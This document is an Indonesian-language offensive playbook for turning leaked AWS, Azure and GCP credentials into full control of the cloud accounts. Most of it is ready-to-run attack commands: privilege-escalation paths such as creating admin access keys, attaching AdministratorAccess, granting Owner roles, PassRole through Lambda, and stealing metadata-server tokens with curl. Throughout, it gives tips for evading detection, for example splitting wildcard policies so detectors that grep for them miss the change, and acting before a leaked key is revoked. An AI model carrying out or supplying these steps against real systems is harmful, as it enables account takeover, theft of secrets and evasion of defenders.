# w2-cred-to-pivot — cloud

# Ditemukan Credential Cloud di Repo/Environment: Flow Konversi ke Akses Penuh

## 0. Triage awal — apa yang kamu punya

| Artefak ditemukan | Tipe kredensial | Langsung bisa dipakai? | Catatan |
|---|---|---|---|
| `AKIA*` + `wJalrXUtnFEMI...` | AWS long-term access key (IAM user) | Ya, sampai di-revoke | Cek usia via `aws iam get-access-key-last-used` (butuh izin) |
| `ASIA*` + secret + `X-Amz-Security-Token` | AWS STS temporary (role/SSO) | Ya, sampai TTL habis (default 1h, max 12h) | Cek `Expiration` di token |
| `.aws/credentials` di container/CI | Profil apa pun | Tergantung | Cek `~/.aws/config` untuk `role_arn`+`source_profile` (chained) |
| `AWS_WEB_IDENTITY_TOKEN_FILE` + `AWS_ROLE_ARN` | IRSA (EKS) / OIDC | Ya, jika pod masih hidup | Token JWT TTL ~24h, tidak bisa refresh dari luar pod |
| Azure SP JSON `{appId, password, tenant}` | Service Principal client secret | Ya | Cek `endDate` di secret |
| Azure managed identity endpoint `169.254.169.254` | IMDS token | Hanya dari dalam resource | Butuh SSRF/RCE di VM/container tersebut |
| GCP SA JSON `type: service_account` | Long-lived key | Ya, sampai di-disable | `private_key_id` unik, mudah di-audit |
| GCP `gcloud` ADC (`~/.config/gcloud/application_default_credentials.json`) | User refresh token | Ya, sampai revoke | `type: authorized_user` |

**Urutan operasi:** identifikasi → validasi → enumerate → eskalasi → persist. Jangan enumerate sebelum validasi (noise).

---

## 1. AWS — Check quarter (identitas dulu, bukan permission)

### 1.1 Validasi + identitas

```bash
# Set dulu (jangan export ke shell interaktif — pakai env per-perintah)
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...     # hanya jika ASIA*
export AWS_DEFAULT_REGION=us-east-1

aws sts get-caller-identity
```

Output yang menentukan langkah berikutnya:

```json
{
  "UserId": "AROAXXXXXXXXXXXXXXXXX:deploy-bot",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/GitHubDeployRole/deploy-bot"
}
```

Interpretasi `Arn`:

| Pola ARN | Artinya | Implikasi |
|---|---|---|
| `:user/nama` | IAM user long-term | Bisa ada access key lain, MFA mungkin tidak wajib |
| `:assumed-role/Role/session` | STS role | TTL terbatas, tidak bisa buat access key baru untuk role ini |
| `:root` | Root account | Game over, jangan disentuh (alarm) |
| `:assumed-role/AWSReservedSSO_...` | SSO | Cek `aws sso` session TTL |

### 1.2 Cek apakah credential masih hidup & kapan terakhir dipakai

```bash
aws sts get-caller-identity --query 'Account' --output text   # buktikan akun
aws iam get-access-key-last-used --access-key-id AKIA...      # butuh iam:GetAccessKeyLastUsed
```

`get-access-key-last-used` **hanya** bisa dipanggil jika principal punya `iam:GetAccessKeyLastUsed`; kalau `AccessDenied` — tandai, jangan retry (lihat §5).

### 1.3 Enumeration ladder (dari murah → mahal, dari aman → berisik)

```bash
# Rung 1 — permission diri sendiri (paling aman, sering tidak ada)
aws iam list-attached-user-policies --user-name NAMA    # jika user
aws iam list-user-policies --user-name NAMA
aws iam list-attached-role-policies --role-name NAMA    # jika role
aws iam list-role-policies --role-name NAMA             # inline

# Rung 2 — simulasi (butuh iam:SimulatePrincipalPolicy, sering ada di role admin-ish)
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/NAMA \
  --action-names iam:CreateAccessKey iam:PassRole sts:AssumeRole \
                  s3:GetObject lambda:InvokeFunction \
  --query 'EvaluationResults[].{A:EvalActionName,D:EvalDecision}'

# Rung 3 — enumerate akun (noise tinggi)
aws iam list-users
aws iam list-roles --query 'Roles[].{N:RoleName,A:Arn}'
aws iam list-policies --scope Local
aws s3 ls
aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId'

# Rung 4 — enumerate-iam (Pacu/Andres Riancho, v1.0.x)
python3 enumerate-iam.py --access-key AKIA... --secret-key ... --region us-east-1
```

`enumerate-iam` menyusuri ~100 API call lintas service; setiap panggilan **muncul di CloudTrail sebagai `AccessDenied`** — berisik. Jalankan hanya jika Rung 1–3 kosong.

`Pacu` (Rhino Security Labs, v1.5.x) — pakai modulnya untuk enumerasi terarah:

```bash
pacu
# dalam sesi
import_keys --access-key-id AKIA... --secret-access-key ...
run iam__enum_permissions
run iam__enum_users_roles_policies_groups
run iam__privesc_scan --offline
```

`iam__privesc_scan` mengembalikan daftar jalur privesc berdasarkan permission yang terdeteksi. Itu input untuk §2.

### 1.4 Tabel jalur privesc per permission (AWS)

| Permission | Jalur | Privesc final | Jejak CloudTrail (eventSource/eventName) |
|---|---|---|---|
| `iam:CreatePolicyVersion` | Buat versi baru policy existing dgn `*:*`, `--set-as-default` | Full control atas policy — jika policy itu menempel ke principal admin | `iam:CreatePolicyVersion` |
| `iam:SetDefaultPolicyVersion` | Aktifkan versi lama/baru yang permisif | Sama seperti di atas | `iam:SetDefaultPolicyVersion` |
| `iam:CreateAccessKey` | Buat key untuk user lain (termasuk admin) | Kredensial baru sebagai user itu | `iam:CreateAccessKey` |
| `iam:CreateLoginProfile` / `iam:UpdateLoginProfile` | Set/reset password console user lain | Akses console | `iam:CreateLoginProfile`, `iam:UpdateLoginProfile` |
| `iam:AttachUserPolicy` / `AttachRolePolicy` / `AttachGroupPolicy` | Attach `AdministratorAccess` ke principal | Full | `iam:Attach*Policy` |
| `iam:PutUserPolicy` / `PutRolePolicy` / `PutGroupPolicy` | Inline policy `*:*` | Full | `iam:Put*Policy` |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 dgn instance profile admin, lalu SSM ke dalam | Full lewat instance | `iam:PassRole`, `ec2:RunInstances` |
| `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Lambda dgn role admin, invoke → exfil env | Full lewat Lambda | `iam:PassRole`, `lambda:CreateFunction`, `lambda:InvokeFunction` |
| `iam:PassRole` + `glue:CreateDevEndpoint` | Glue dev endpoint dgn role admin, SSH | RCE di VPC + role | `iam:PassRole`, `glue:CreateDevEndpoint` |
| `iam:PassRole` + `cloudformation:CreateStack` | Stack dgn role admin | Full | `iam:PassRole`, `cloudformation:CreateStack` |
| `sts:AssumeRole` | Assume role yang lebih tinggi | Tergantung trust policy role target | `sts:AssumeRole` |
| `lambda:UpdateFunctionCode` | Inject kode ke Lambda existing (sudah punya role) | Role Lambda | `lambda:UpdateFunctionCode` |
| `lambda:AddPermission` (cross-account) | Invoke Lambda dari akun luar | Sama | `lambda:AddPermission` |
| `s3:PutBucketPolicy` | Grant akses ke bucket sensitif | Data | `s3:PutBucketPolicy` |
| `iam:UpdateAssumeRolePolicy` | Ubah trust agar bisa assume role admin | Full | `iam:UpdateAssumeRolePolicy` |
| `iam:AddUserToGroup` | Tambah ke group admin | Full | `iam:AddUserToGroup` |
| `iam:UploadSSHPublicKey` / `UpdateSSHPublicKey` | SSH ke CodeCommit (bukan privesc, tapi persist) | Persist | `iam:UploadSSHPublicKey` |
| `ssm:SendCommand` | Jalankan perintah di instance yg punya role | Role instance | `ssm:SendCommand` |
| `ecs:UpdateService` / `ecs:RegisterTaskDefinition` | Task definition dgn role baru | Role baru | `ecs:RegisterTaskDefinition`, `ecs:UpdateService` |
| `secretsmanager:GetSecretValue` | Ambil secret (sering berisi cred lain) | Lateral | `secretsmanager:GetSecretValue` |
| `ssm:GetParameter` (`WithDecryption`) | Ambil secret di Parameter Store | Lateral | `ssm:GetParameter` |

### 1.5 Perintah persis per jalur (copy-paste)

**Jalur A — CreateAccessKey untuk user admin**

```bash
aws iam create-access-key --user-name admin-svc
# → { "AccessKey": { "AccessKeyId": "AKIA...", "SecretAccessKey": "...", "Status": "Active" } }
aws sts get-caller-identity   # verifikasi identitas baru
```

Jejak: `iam:CreateAccessKey` (CloudTrail `eventName`, `userIdentity.arn` = principal penyerang, `requestParameters.userName` = `admin-svc`). Alarm CloudWatch standar `UnauthorizedAPICall` + `CreateAccessKey` tidak tertangkap otomatis — biasanya hanya detector khusus.

**Jalur B — Attach AdministratorAccess**

```bash
aws iam attach-user-policy --user-name NAMA \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
# atau untuk role
aws iam attach-role-policy --role-name NAMA \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Jejak: `iam:AttachUserPolicy` / `iam:AttachRolePolicy` dgn `requestParameters.policyArn` = `arn:aws:iam::aws:policy/AdministratorAccess`. Ini signature **khas** yang biasanya sudah ada rule-nya — kena guardrail paling cepat.

**Jalur C — PutUserPolicy inline `*:*`**

```bash
aws iam put-user-policy --user-name NAMA --policy-name x \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

Jejak: `iam:PutUserPolicy`, `requestParameters.policyDocument` (string JSON — bisa di-grep untuk `"Action":"*"`). Banyak detektor grep string ini; **hindari literal `*`** — pecah jadi dua statement (`"Action":["iam:*","sts:*"]`) jika guardrail grep.

**Jalur D — CreatePolicyVersion pada policy yg menempel ke admin**

```bash
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/DefenderPolicy \
  --policy-document file://evil.json \
  --set-as-default
```

`evil.json`:
```json
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
```

Jejak: `iam:CreatePolicyVersion` dgn `requestParameters.setAsDefault=true`. Tidak ada parameter `userName`/`roleName` — jadi **tidak terlihat sebagai modifikasi principal**, hanya modifikasi policy. Sering lolos dari rule "policy attached to X changed" karena arn-nya beda. Cek dulu `aws iam list-entities-for-policy --policy-arn ...` untuk tahu siapa yang terdampak sebelum eksekusi.

**Jalur E — PassRole + Lambda**

```bash
# 1. Cek role admin yang bisa di-passrole
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS==`arn:aws:iam::123456789012:root`]].RoleName'

# 2. Buat Lambda dgn role itu
cat > /tmp/fn.zip < /dev/null
aws lambda create-function \
  --function-name debug-fn-$(date +%s) \
  --runtime python3.12 --handler index.handler \
  --role arn:aws:iam::123456789012:role/AdminRole \
  --zip-file fileb:///tmp/fn.zip

# 3. Invoke → di dalam Lambda, kredensial role otomatis ada di env
aws lambda invoke --function-name debug-fn-... /tmp/out.json
```

Jejak: `iam:PassRole` (dengan `requestParameters.roleARN`), `lambda:CreateFunction`, `lambda:InvokeFunction`. `iam:PassRole` adalah **signal tertinggi** untuk rule "PassRole to admin" — hampir setiap org punya rule ini. Jalur ini berisik.

**Jalur F — AssumeRole chain**

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/TargetRole \
  --role-session-name recon-$(date +%s) \
  --duration-seconds 3600
```

Cek dulu apakah trust policy mengizinkan principal kita:
```bash
aws iam get-role --role-name TargetRole --query 'Role.AssumeRolePolicyDocument'
```

Jejak: `sts:AssumeRole` dgn `requestParameters.roleArn` + `roleSessionName`. Rule umum mendeteksi `roleSessionName` aneh / bukan dari CI yang dikenal.

### 1.6 Verifikasi setelah eskalasi

```bash
aws sts get-caller-identity                               # identitas baru
aws iam list-attached-user-policies --user-name NAMA
aws iam simulate-principal-policy --policy-source-arn ... \
  --action-names iam:CreateUser iam:AttachUserPolicy
```

---

## 2. Azure — alur sejenis

### 2.1 Triage service principal

```bash
az login --service-principal \
  -u $AZURE_CLIENT_ID \
  -p $AZURE_CLIENT_SECRET \
  --tenant $AZURE_TENANT_ID
az account show
az ad signed-in-user show --query '{displayName,userPrincipalName}' 2>/dev/null \
  || az ad sp show --id $AZURE_CLIENT_ID --query '{appId,displayName,servicePrincipalType}'
```

Output menentukan jalur:
- `servicePrincipalType: Application` → SP biasa, cek role assignment.
- `servicePrincipalType: ManagedIdentity` → hanya bisa dari resource asal (IMDS tidak bisa dari luar).
- `type: User` → account user, cek MFA & role.

### 2.2 Enumerasi role assignment

```bash
az role assignment list --assignee $AZURE_CLIENT_ID --all -o table
az role definition list --custom-role-only true --query '[].{N:roleName,A:assignableScopes}'
az resource list --query '[].[name,type,location]'
az keyvault list --query '[].name'
```

### 2.3 Tabel jalur privesc Azure

| Permission (role action) | Jalur | Privesc final | Log (Activity Log: operationName) |
|---|---|---|---|
| `Microsoft.Authorization/roleAssignments/write` (Owner/User Access Admin) | Assign `Owner` ke diri sendiri / SP | Full subscription | `Microsoft.Authorization/roleAssignments/write` |
| `Microsoft.Authorization/roleDefinitions/write` | Buat custom role `*` lalu assign | Full | `Microsoft.Authorization/roleDefinitions/write` |
| `Microsoft.ManagedIdentity/userAssignedIdentities/*/assign/action` + `.../managedIdentities/...` | Attach MI Owner ke VM/Function yg dikontrol | Identitas baru | `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action` |
| `Microsoft.Compute/virtualMachines/runCommand/action` | Jalankan perintah di VM → ambil MI token | MI VM | `Microsoft.Compute/virtualMachines/runCommand/action` (Action) |
| `Microsoft.KeyVault/vaults/secrets/getSecret/action` | Ambil secret | Lateral | `Microsoft.KeyVault/vaults/secrets/getSecret/action` (DataAction — butuh diagnostic setting) |
| `Microsoft.Graph/Applications/*` (perlu Graph perm) | Tambah credential ke app lain | App tsb | Graph audit log (`Update application – Certificates and secrets management`) |
| `Microsoft.Authorization/elevateAccess/action` (Global Admin) | Elevate ke User Access Admin di root | Subscription-wide | `Microsoft.Authorization/elevateAccess/action` |

### 2.4 Perintah persis (jalur role assignment)

```bash
# 1. Cek apakah boleh assign di scope subscription
az role assignment create \
  --assignee $AZURE_CLIENT_ID \
  --role Owner \
  --scope /subscriptions/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
# 2. Verifikasi
az role assignment list --assignee $AZURE_CLIENT_ID --all -o table
```

Jejak Activity Log (Azure Monitor → Activity Log, kategori `Administrative`): `Microsoft.Authorization/roleAssignments/write`, `properties.requestbody.roleDefinitionId` = Owner, `callerIpAddress` = IP eksekusi. **Retensi Activity Log default 90 hari**, tidak dikirim ke Log Analytics kecuali diagnostic setting aktif.

**Jalur MI via runCommand:**
```bash
az vm run-command invoke -g rg-1 -n vm-1 --command-id RunShellScript \
  --scripts 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"'
```

Jejak: `Microsoft.Compute/virtualMachines/runCommand/action` + VMAgent logs. Rule umum: `runCommand` dari SP baru pada VM yang tidak biasanya.

**Jalur tambah credential ke app lain (butuh Graph perms):**
```bash
az ad app credential reset --id <APP_ID> --credential-description recon \
  --years 1 --append
# → output password baru untuk APP_ID tersebut
```

Jejak Graph audit: `Update application – Certificates and secrets management`, `initiatedBy` = SP penyerang. **Hanya terlihat jika SP punya audit permission di tenant (biasanya tidak)** — SP tidak punya log sendiri; log ada di tenant target.

---

## 3. GCP — alur sejenis

### 3.1 Triage service account key

```bash
gcloud auth activate-service-account --key-file=sa.json
gcloud config get-value project
gcloud auth list
gcloud iam service-accounts describe $(gcloud config get-value account)
```

Cek `type` di JSON: `service_account` (long-lived) atau `authorized_user` (refresh token user).

### 3.2 Enumerasi IAM

```bash
PROJECT=$(gcloud config get-value project)
gcloud projects get-iam-policy $PROJECT --format=json | jq '.bindings[] | {role,members}'
gcloud iam service-accounts list
gcloud iam roles list --project=$PROJECT --format='table(name,title)'
gcloud compute instances list
gcloud storage ls
```

### 3.3 Tabel jalur privesc GCP

| Permission | Jalur | Privesc final | Log (Cloud Audit Logs: methodName) |
|---|---|---|---|
| `iam.serviceAccounts.actAs` + `compute.instances.create` | Buat VM dgn SA admin | SA admin | `compute.instances.insert`, `iam.serviceAccounts.actAs` |
| `iam.serviceAccounts.actAs` + `cloudfunctions.functions.create` | Function dgn SA admin | SA admin | `cloudfunctions.functions.create` |
| `iam.serviceAccounts.actAs` + `run.services.create` | Cloud Run dgn SA admin | SA admin | `run.services.create` |
| `iam.serviceAccountKeys.create` | Buat key SA | Key SA | `google.iam.admin.v1.CreateServiceAccountKey` (Admin Activity) |
| `iam.serviceAccounts.setIamPolicy` | Set policy SA | Kontrol SA | `SetIamPolicy` (Admin Activity) |
| `resourcemanager.projects.setIamPolicy` | Grant role Owner ke diri sendiri | Project | `SetIamPolicy` (Admin Activity) |
| `iam.roles.create` + `iam.roles.update` | Custom role `*` lalu assign | Project | `google.iam.admin.v1.CreateRole`, `UpdateRole` |
| `compute.instances.setMetadata` | Set `startup-script` di VM existing → RCE via SA-nya | SA VM | `v1.compute.instances.setMetadata` (Admin Activity) |
| `compute.instances.setServiceAccount` | Attach SA admin ke VM yg dikontrol | SA admin | `v1.compute.instances.setServiceAccount` |
| `secretmanager.versions.access` | Baca secret | Lateral | `google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion` (Data Access — harus explicitly enabled) |
| `storage.objects.get` (buckets sensitif) | Data | Data | `storage.objects.get` (Data Access) |

### 3.4 Perintah persis

**Jalur SA key (paling cepat):**
```bash
SA="admin-sa@project.iam.gserviceaccount.com"
gcloud iam service-accounts keys create /tmp/k.json --iam-account=$SA
gcloud auth activate-service-account --key-file=/tmp/k.json
gcloud auth print-access-token
```

Jejak: `google.iam.admin.v1.CreateServiceAccountKey` — **Admin Activity log**, selalu on, tidak bisa dimatikan, retensi 400 hari. Signature tinggi. Jalur ini paling jelek.

**Jalur setIamPolicy (lebih senyap dari key):**
```bash
gcloud projects add-iam-policy-binding $PROJECT \
  --member="serviceAccount:$SA_ATTACKER" --role="roles/owner"
```

Jejak: `SetIamPolicy` pada resource project, `policyDelta` berisi binding Owner baru. Admin Activity log — selalu muncul.

**Jalur actAs + Cloud Function:**
```bash
gcloud functions deploy recon-$(date +%s) \
  --runtime python312 --trigger-http --allow-unauthenticated \
  --service-account admin-sa@project.iam.gserviceaccount.com \
  --entry-point handler --source .
```

`handler` mengembalikan `os.environ` + `google.auth.default()` token. Jejak: `cloudfunctions.functions.create` + `iam.serviceAccounts.actAs`. **`actAs` biasanya muncul sebagai `google.iam.admin.v1.GenerateAccessToken` atau sudah ter-embed di request create** — cek `methodName` sesuai API version.

**Jalur metadata server (jika sudah RCE di instance):**
```bash
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

Tidak ada log GCP yang mencatat akses metadata — hanya bisa terdeteksi via VPC flow logs / egress monitoring ke `169.254.169.254`.

---

## 4. CloudTrail / Audit log — apa yang muncul secara persis

### 4.1 AWS CloudTrail record untuk `sts:AssumeRole`

```json
{
  "eventVersion": "1.09",
  "eventTime": "2024-11-15T10:22:13Z",
  "eventSource": "sts.amazonaws.com",
  "eventName": "AssumeRole",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.55",
  "userAgent": "aws-cli/2.15.30 Python/3.11.6 Linux/6.5.0 exe/x86_64",
  "requestParameters": {
    "roleArn": "arn:aws:iam::123456789012:role/TargetRole",
    "roleSessionName": "recon-1731662533",
    "durationSeconds": 3600
  },
  "responseElements": {
    "credentials": { "accessKeyId": "ASIA...", "expiration": "Nov 15, 2024, 11:22:13 AM" },
    "assumedRoleUser": { "arn": "arn:aws:sts::123456789012:assumed-role/TargetRole/recon-1731662533" }
  }
}
```

Field yang di-monitor oleh detection rule umum: `sourceIPAddress` (tidak dikenal), `userAgent` (CLI dari IP non-CI), `roleSessionName` (pola tidak standar), `requestParameters.durationSeconds` (max 12h dari CLI — sering jadi indikator).

### 4.2 AWS CloudTrail untuk `iam:CreateAccessKey`

```json
{
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreateAccessKey",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::123456789012:assumed-role/GitHubDeployRole/deploy-bot"
  },
  "requestParameters": { "userName": "admin-svc" },
  "responseElements": { "accessKey": { "accessKeyId": "AKIA...", "status": "Active" } }
}
```

**Catatan penting:** `CreateAccessKey` tidak mencatat `secretAccessKey` di CloudTrail — jadi tidak bisa dipulihkan dari log, hanya key ID.

### 4.3 Yang **tidak** muncul di CloudTrail default

- Data event S3 (`s3:GetObject`) — harus mengaktifkan **S3 data event logging** per-bucket, biaya tambahan.
- `secretsmanager:GetSecretValue` — **CloudTrail management event only**; `GetSecretValue` adalah data event, hanya muncul jika `eventSelectors` diatur ke `readWriteType: All` **dan** trail multi-region.
- IMDS call dari instance — tidak ada di CloudTrail; deteksi via VPC flow logs / host-based.
- S3 presigned URL generation (`s3:PutObject` via URL) — muncul sebagai `s3:PutObject` di data event; presigned GET tidak muncul jika hanya signature.

### 4.4 Azure Activity Log untuk role assignment

```json
{
  "operationName": "Microsoft.Authorization/roleAssignments/write",
  "category": "Administrative",
  "callerIpAddress": "203.0.113.55",
  "caller": "sp-attacker-app-id",
  "properties": {
    "requestbody": "{\"roleDefinitionId\":\"/subscriptions/.../roleDefinitions/8e3af657...\",\"principalId\":\"...\"}",
    "roleDefinitionId": "8e3af657-a8ff-443c-a75c-2fe8c4bcb635"  // Owner
  }
}
```

### 4.5 GCP Admin Activity log untuk `SetIamPolicy`

```json
{
  "protoPayload": {
    "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
    "methodName": "SetIamPolicy",
    "serviceName": "cloudresourcemanager.googleapis.com",
    "authenticationInfo": { "principalEmail": "sa-attacker@project.iam.gserviceaccount.com" },
    "requestMetadata": { "callerIp": "203.0.113.55" },
    "serviceData": {
      "policyDelta": { "bindingDeltas": [
        { "action": "ADD", "role": "roles/owner",
          "member": "serviceAccount:sa-attacker@project.iam.gserviceaccount.com" }
      ]}
    }
  }
}
```

---

## 5. Jebakan operasional yang bikin teknik gagal di lapangan

| # | Jebakan | Kenapa gagal | Mitigasi |
|---|---|---|---|
| 1 | **MFA pada STS untuk `sts:AssumeRole`** — banyak org pasang `aws:MultiFactorAuthPresent: true` di trust policy | `AssumeRole` gagal `AccessDenied` dgn pesan "MFA required" | Cek `aws iam get-role --role-name X --query 'Role.AssumeRolePolicyDocument'` **sebelum** eksekusi; jangan retry — retry bikin alarm |
| 2 | **SCP (Service Control Policy) blok `iam:CreateAccessKey` / `iam:Attach*Policy`** di OU | API call sukses tapi tidak menghasilkan privesc fungsional; atau langsung `AccessDenied` w/ SCP arn di error | `aws organizations describe-policy` butuh izin; alternatif — jalankan `simulate-principal-policy` dulu, cek apakah ada SCP yang `Deny` |
| 3 | **Guarded role: `AWSReservedSSO_*` / `OrganizationAccountAccessRole` tidak punya trust ke principal kita** | `AssumeRole` → `AccessDenied` jelas, noise | Enumerasi trust policy dulu; prioritaskan role yang trust `:root` atau `*` |
| 4 | **`iam:SimulatePrincipalPolicy` sendiri ditolak** — sering ada tapi butuh `iam:SimulatePrincipalPolicy` yang tidak semua role punya | Gagal total; fallback ke `enumerate-iam` = noise besar | Cek apakah Rung 1 memberi hasil; jangan lompat ke enumerate-iam |
| 5 | **STS token expired di tengah operasi** (ASIA*, TTL 1 jam) | `ExpiredToken` di tengah jalur; data enumeration hilang | Track `Expiration` dari `get-caller-identity`? Tidak ada — `sts get-session-token` saja. Simpan start time, refresh di 50 menit |
| 6 | **Key korban di-revoke 30 menit setelah repo ditemukan** — tim security sudah reaktif | Semua API call balik `InvalidClientTokenId` / `AuthFailure` | Triage cepat: validasi → identitas → **simpan satu akses baru** (CreateAccessKey / AssumeRole) sebelum enumerate. Tetapi ini justru bikin noise tinggi — konflik operasional nyata |
| 7 | **SCP `Deny iam:CreateAccessKey` + `Deny iam:Attach*` tanpa deny `sts:AssumeRole`** | Semua jalur IAM mati, tapi jalur PassRole+Lambda masih hidup | Tabel §1.4: prioritaskan jalur yg tidak menyentuh `iam:*Create`/`Attach`. PassRole & lambda:CreateFunction antipeluru SCP umum |
| 8 | **GuardDuty `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`** menyala saat ASIA* dipakai dari luar EC2 | Temuan P1 di SIEM, bisa trigger auto-disable key | Jangan pakai kredensial IMDS dari IP luar — pivot lewat instance yang sama atau SSM SendCommand |
| 9 | **CloudTrail Lake / EventBridge tidak retensi < 90 hari** di akun target | Deteksi retroaktif tidak terjadi; tapi sidang post-mortem tetap ada | Bukan jebakan untuk kita — jebakan untuk defender. Untuk penyerang, ini *advantage* |
| 10 | **Azure: SP tanpa `Microsoft.Graph` permission sama sekali** — tidak bisa enumerate directory | `az ad user list` → `Insufficient privileges`; hanya resource-plane | Fokus ke `az resource list` + `role assignment list`; jangan retry Graph |
| 11 | **Azure: Activity Log diagnostic setting `Send to Log Analytics` off** | Log tetap ada 90 hari di Activity Log, tapi alert realtime tidak jalan | Peluang; tapi jangan asumsikan — beberapa org punya Defender for Cloud alert integr. |
| 12 | **GCP: `CreateServiceAccountKey` requires `iam.serviceAccountKeys.create` + `iam.serviceAccounts.actAs`** — beberapa org deny actAs via org policy | Gagal w/ `PERMISSION_DENIED`; noise Admin Activity | Cek org policy `constraints/iam.disableServiceAccountKeyCreation` (bisa dilihat jika punya `orgpolicy.policy.get`) |
| 13 | **GCP: `AccessSecretVersion` adalah Data Access log — harus explicitly enabled per-project** sebelum ada log | Tidak ada jejak; tapi juga berarti tidak ada deteksi | Kalau ini jalan, akses secret tidak meninggalkan jejak — verifikasi dengan `gcloud logging sinks list` dulu |
| 14 | **`aws s3 ls` di akun dengan ribuan bucket** — timeout + ratusan API call di CloudTrail | Noise, lambat, sering `Throttling` | Pakai `--max-items` + `--page-size 50`; hindari `s3 ls` tanpa batas |
| 15 | **`enumerate-iam` v1.0 sangat lambat (~8 menit / akun)** dan tiap API call = 1 CloudTrail event | Jendela deteksi 8 menit = terlalu lama | Pakai `--quick` jika ada; atau jalankan hanya modul Pacu yg relevan dgn temuan Rung 1 |
| 16 | **PassRole ke role yang punya `PermissionsBoundary` ketat** | Lambda/EC2 jalan tapi efektif tidak berdaya | Cek `aws iam get-role --role-name X --query 'Role.PermissionsBoundary'` sebelum eksekusi |
| 17 | **SCP `Deny` pada semua region kecuali us-east-1** tapi resource target ada di region lain | API call balik `AccessDenied` di region target |

## [lanjutan]

## 7.9 AWS — Ladder Enumerasi Lanjutan (post-identity)

Setelah `sts get-caller-identity` mengonfirmasi identitas, bedakan **principal type** dulu karena permission model-nya beda: IAM user vs assumed-role (STS) vs federated (SSO) vs root vs service-linked role vs Lambda execution role. Masing-masing punya jalur privesc berbeda.

### 7.9.1 Klasifikasi principal & command persis

```bash
# Identitas + siapa sesame
aws sts get-caller-identity
aws sts get-session-token --duration-seconds 129600   # hanya jika user long-term creds
aws iam get-user --user-name <from-arn> 2>/dev/null
aws iam list-attached-user-policies --user-name <u>
aws iam list-user-policies --user-name <u>
aws iam list-groups-for-user --user-name <u>
aws iam get-account-authorization-details --filter User Role Group Policy > authz.json
```

Jika ARN berakhiran `:assumed-role/<RoleName>/<SessionName>`, ambil role-nya:

```bash
aws iam get-role --role-name <RoleName>
aws iam list-attached-role-policies --role-name <RoleName>
aws iam list-role-policies --role-name <RoleName>
aws iam get-role-policy --role-name <RoleName> --policy-name <InlineName>
```

### 7.9.2 Autonomous enumeration ladder (aman, tanpa noise besar)

| Stage | Tujuan | Command persis | Jejak CloudTrail |
|---|---|---|---|
| E1 | identitas | `aws sts get-caller-identity` | `GetCallerIdentity` (tidak tercatat di data events, hanya di CloudTrail management jika org trail) |
| E2 | account-level recon | `aws iam get-account-authorization-details` | `GetAccountAuthorizationDetails` |
| E3 | role list | `aws iam list-roles` | `ListRoles` |
| E4 | policy inline role target | `aws iam get-role-policy --role-name R --policy-name P` | `GetRolePolicy` |
| E5 | policy versions (default) | `aws iam get-policy --policy-arn A` + `aws iam get-policy-version --policy-arn A --version-id vN --query 'PolicyVersion.Document'` | `GetPolicy`, `GetPolicyVersion` |
| E6 | policy attach sebagai managed | `aws iam list-policies --scope Local --query 'Policies[?AttachmentCount>0]'` | `ListPolicies` |
| E7 | boundary & permission | `aws iam get-role --role-name R --query 'Role.PermissionsBoundary'` | `GetRole` |
| E8 | ekspos resource target | `aws s3 ls`, `aws ec2 describe-instances`, `aws secretsmanager list-secrets` | masing-masing Describe/List |
| E9 | kredensial di resources | `aws secretsmanager get-secret-value --secret-id X`, `aws ssm get-parameters-by-path --path / --recursive --with-decryption` | `GetSecretValue`, `GetParametersByPath` |
| E10 | escalation liveness check | `aws iam simulate-principal-policy` (dry-run) atau `pacu` | `SimulatePrincipalPolicy` (bisa di-detect karena dipanggil dari luar console) |

Catatan operasional: **`GetCallerIdentity` tidak punya `resources` field** sehingga tidak muncul di CloudTrail trail standar (management events yang dicatat hanya yang punya resources; banyak org hanya mencatat `Resources[].ARN`). Kalau org trail mencatat semua management events tanpa resources, `GetCallerIdentity` tetap masuk — cek `eventName=GetCallerIdentity` di Lake/Athena.

### 7.9.3 Pacu: mapping command → module

```bash
# install & run
go install github.com/RhinoSecurityLabs/pacu@latest
pacu
# session setup
import_keys default --access-key-id AKIA... --secret-access-key ...
run iam__enum_users_roles_policies_groups
run iam__enum_permissions
run whoami
run iam__privesc_scan --scan-only
```

Modul yang tidak boleh di-skip saat triage cepat: `iam__enum_permissions`, `iam__privesc_scan`, `s3__enum`, `secrets__enum`, `lambda__enum`, `ec2__enum`, `sts__assume_role` (untuk cross-account path yang tersembunyi di trust policy).

### 7.9.4 Jalur privesc per permission — tabel lanjutan (varian baru)

Tabel di bagian sebelumnya sudah cover jalur klasik (CreatePolicyVersion, AttachUserPolicy, PassRole+RunInstances, UpdateAssumeRolePolicy, CreateAccessKey). Yang berikut **belum tercakup**, dan banyak yang baru dipakai 2023+:

| Permission kunci | Primitif | Payload minimal (persis) | CloudTrail eventName |
|---|---|---|---|
| `iam:CreateServiceSpecificCredential` | kredensial CodeCommit HTTPS/SSH sebagai user target | `aws iam create-service-specific-credential --user-name V --service-name codecommit.amazonaws.com` | `CreateServiceSpecificCredential` |
